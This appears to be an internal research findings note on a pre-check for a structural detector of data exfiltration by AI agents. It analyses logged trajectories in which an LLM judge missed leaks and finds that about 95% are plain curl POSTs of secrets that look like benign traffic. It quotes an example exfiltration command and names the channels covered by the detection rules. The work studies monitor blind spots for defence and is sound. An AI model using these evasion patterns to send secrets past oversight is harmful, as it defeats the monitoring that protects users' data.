# Structural egress-anomaly detector — feasibility pre-check FINDINGS

**Date:** 2026-06-23
**For:** `docs/test-request-structural-egress-anomaly-2026-06-23.md` (LOW / exploratory; does NOT gate p15b)
**Method:** pure post-hoc analysis of logged p15a trajectories — `scripts/egress-anomaly-precheck.py` (no cloud run).
**Question:** before building a tree-VAE, is there a real experiment — and what outcome should we expect?

---

## 1. Numbers (from the pre-check, reproducible via the script)

| Quantity | Value |
|---|--:|
| Benign egress calls (N — FPR/train population) | **821** (of 12,227 tool calls, 1,200 runs, 212 distinct cmd-stems) |
| Judge-missed positives P (`exfiltrationDetected` ∧ no `hijacked` verdict) | **4,026** (3,306 with an identifiable egress call) |
| P caught by deterministic Stage-1 rules (git-push / dns-base32 / image-GET) | 208 |
| **P surviving Stage-1 (the real test corpus)** | **3,818** |

P by source: crackvec 3,201 · t3e-t4-t5 454 · openweights-t3e 363 · t5-multiagent 8.

**Stage-1-residual by egress channel** (the decisive breakdown):

| channel | count | share |
|---|--:|--:|
| **http-post** | **3,617** | **~95%** |
| tool-arg | 153 | 4% |
| http-get | 45 | 1% |
| (mixed) | 3 | — |

---

## 2. The finding — the residual is structurally *benign-looking*, not exotic

Three of my pre-check worries were tested:

1. **Benign egress is NOT thin (821 calls)** → the learned-VAE arm is technically
   viable (earlier worry retracted). Split FPR **by task (L1–L10), not by call** —
   the benign set is 10 tasks × reps, so a random call-split would leak near-dupes
   into train and give an optimistic ~0 FPR.
2. **The circularity guard matters:** 208 of P are exactly the deterministic shapes
   Stage-1 already catches. Scoring a detector on raw P=4,026 would be near-tautological;
   it must be scored on the **3,818 Stage-1 survivors**.
3. **The headline twist:** ~**95% of the Stage-1-residual is plain `http-post`**
   (`curl -X POST http://…/api/verify -d <secret>`). The benign egress population is
   *also* `curl`/POST-dominated (npm registry checks, `curl -X POST …/api/mcp-verify`).
   So the judge-missed leaks are **not structurally exotic** — they are vanilla POSTs
   whose *structure* matches benign tooling; only the *semantics* differ (and semantics
   is the axis the judge already failed on).

## 3. Expected outcome (pre-registered before building the VAE)

A structural detector keying on payload entropy / encoding markers / destination
novelty / argument-tree shape will **struggle to separate `POST secret→/api/verify`
from `POST →registry.npmjs.org`** — they have the same form. So:

- **Most likely:** low recall on the http-post residual at FPR ≤ standard → confirms
  the §4.5 blind spot is **structural/intrinsic, not an implementation gap** →
  *strengthens* the paper's negative result. Publishable as-is.
- The detector *will* catch the encoded/alternate-egress slice (the 45 http-get +
  some tool-arg + the 208 Stage-1 shapes) — i.e. it re-derives Stage-1, adding little
  beyond the cheap heuristic.
- **Deployable recommendation regardless:** the deterministic egress heuristic, not a
  learned model — unless the tree-VAE demonstrably beats it on the http-post residual
  (the data predicts it won't).

## 4. Decision

A real experiment exists (3,818 survivors vs 821 benign), but the data **predicts a
negative/blind-spot-confirming result**, not a closure of the class. Worth running
**only as a negative-result strengthener for §4.5 / a P15c note**, scored on the
Stage-1 residual with task-split FPR — not as a defence improvement. LOW priority;
does not gate p15b. The cheap deterministic control is the likely deployable answer.

Reproduce: `python3 scripts/egress-anomaly-precheck.py`
